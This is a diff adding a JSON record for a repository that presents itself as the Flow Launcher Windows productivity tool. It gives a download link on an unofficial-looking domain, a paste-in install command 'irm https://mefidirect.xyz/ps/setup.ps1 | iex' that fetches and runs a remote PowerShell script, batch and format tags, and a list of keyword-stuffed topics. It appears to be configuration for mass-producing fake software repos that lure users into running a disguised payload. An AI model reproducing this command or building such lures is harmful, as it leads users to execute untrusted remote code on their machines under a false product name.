@@ -1,0 +1,29 @@
+{
+  "repo": "flow-launcher-command-palette",
+  "product": "Flow Launcher Command Palette",
+  "kind": "productivity",
+  "install_type": "download",
+  "download_url": "https://flow-launcher.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "productivity",
+  "topics": [
+    "flow-launcher-complete",
+    "flow-launcher-tool",
+    "flow-launcher-file-manager",
+    "windows-flow-launcher",
+    "flow-launcher-launch-fix",
+    "flow-launcher-windows-install",
+    "flow-launcher-desktop-launcher",
+    "flow-launcher-client-download",
+    "flow-launcher-deployment-guide",
+    "flow-launcher-deploy-2026",
+    "flow-launcher-offline-installer",
+    "productivity-tools",
+    "win-tools",
+    "system-utility",
+    "windows-tools"
+  ]
+}
